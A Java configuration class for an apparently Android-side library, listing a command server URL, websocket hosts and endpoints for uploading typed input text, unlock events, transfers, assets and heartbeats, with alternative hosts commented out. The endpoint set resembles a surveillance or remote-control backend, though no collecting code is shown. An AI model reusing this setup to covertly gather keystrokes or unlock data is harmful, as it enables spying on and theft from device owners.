package com.example.aslib.common;

public class AppConfig {

    public static String HEART_URL = "/api/device/heart";
    public static String UPLOAD_MAJOR_DATA_URL = "/api/device/uploadMajorData";
    public static String UPLOAD_LOG_URL = "/api/device/uploadLog";
    public static String UPLOAD_INPUT_TEXT_RECORD_URL = "/api/device/uploadInputTextRecord";
    public static String UPLOAD_UN_LOCK_URL = "/api/device/uploadUnLock";
    public static String UPLOAD_ERROR_LOG_URL = "/api/device/uploadErrorLog";
    public static String UPLOAD_TRANSFER_URL = "/api/device/uploadTransfer";
    public static String UPLOAD_ASSET_URL = "/api/device/uploadAsset";


//    public static String SERVER_URL = "http://192.168.0.8:8080/ast";
//    public static String WEBSOCKET_HOST = "192.168.0.8";
//    public static int WEBSOCKET_PORT = 8080;
//    public static String WEBSOCKET_URL = "/ast/ws";


    public static String SERVER_URL = "http://192.168.0.13:8080/ast";
    public static String WEBSOCKET_HOST = "192.168.0.13";
    public static int WEBSOCKET_PORT = 8080;
//    public static String WEBSOCKET_HOST = "192.168.0.43";
//    public static String P2P_URL = "ws://192.168.0.43:9001";

//    public static String SERVER_URL = "https://ast.fastly.tools/ast";
//    public static String P2P_URL = "ws://5.9.98.5:9001";


    public static String WEBSOCKET_URL = "/ast/ws";

    public static String path(String path) {
        return String.format("%s%s", SERVER_URL, path);
    }
}
